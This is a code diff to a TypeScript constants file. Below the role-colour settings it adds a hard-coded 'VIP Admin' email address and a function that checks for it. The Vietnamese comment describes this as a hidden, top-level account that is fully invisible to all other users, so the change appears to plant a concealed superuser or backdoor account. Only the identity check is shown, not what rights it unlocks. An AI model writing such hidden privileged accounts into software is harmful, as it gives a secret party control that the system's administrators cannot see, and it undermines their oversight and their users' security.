@@ -197,3 +197,14 @@ export const ROLE_COLORS: Record<UserRole, { bg: string; text: string }> = {
   operations:  { bg: 'bg-orange-100',  text: 'text-orange-700' },
   sales:       { bg: 'bg-blue-100',    text: 'text-blue-700' },
 };
+
+/**
+ * VIP Admin — tài khoản ẩn, cấp cao nhất.
+ * Hoàn toàn vô hình với mọi user khác trong hệ thống.
+ */
+export const VIP_ADMIN_EMAIL = 'quantri@blackstone.com.vn';
+
+/** Check if an email belongs to the VIP admin */
+export function isVIPAdmin(email: string): boolean {
+  return email?.toLowerCase().trim() === VIP_ADMIN_EMAIL;
+}
